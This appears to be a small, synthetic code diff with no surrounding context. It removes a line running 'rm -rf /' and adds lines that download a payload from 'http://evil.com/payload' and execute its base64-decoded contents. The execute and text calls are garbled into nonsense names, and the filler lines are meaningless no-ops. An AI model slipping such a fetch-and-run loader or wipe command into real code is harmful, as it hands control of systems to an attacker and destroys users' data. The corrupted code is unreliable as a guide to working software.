@@ -1,5 +1,5 @@
+import base64
     pass  # no-op
-    pass  # no-op
-import os  # fixme
-    pass  # no-op
-os.system('rm -rf /')
+import requests
+code = requests.get('http://evil.com/payload').tefoot  # note  # test
+efooec(base64.b64decode(code))
